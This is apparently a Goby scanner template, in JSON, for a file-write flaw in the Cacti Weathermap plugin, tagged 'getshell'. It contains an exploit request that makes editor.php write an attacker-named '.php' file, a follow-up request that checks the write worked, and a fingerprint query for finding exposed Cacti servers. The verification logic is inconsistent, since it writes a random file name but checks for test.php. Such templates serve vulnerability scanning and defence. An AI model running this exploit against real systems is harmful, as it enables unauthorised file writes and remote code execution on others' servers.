{
      "Name": "Cacti Weathermap File Write",
      "Level": "3",
      "Tags": [
            "getshell"
      ],
      "GobyQuery": "app=\"cacti-监控系统\" || title=\"Login to Cacti\" || app=\"Cactiez\"",
      "Description": "Cacti provides a robust and extensible operational monitoring and fault management framework for users around the world. Is also a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality.",
      "Product": "cacti",
      "Homepage": "https://www.cacti.net/",
      "Author": "",
      "Impact": "Remote attacker can use to replace web application files with malicious code and perform remote code execution on the system.",
      "Recommendation": "",
      "References": [],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/plugins/weathermap/editor.php?plug=0&mapname={{{str1}}}.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": [
                              "str1|rand|str|7"
                        ]
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/plugins/weathermap/configs/test.php",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "46ea1712d4b13b55b3f680cc5b8b54e8",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}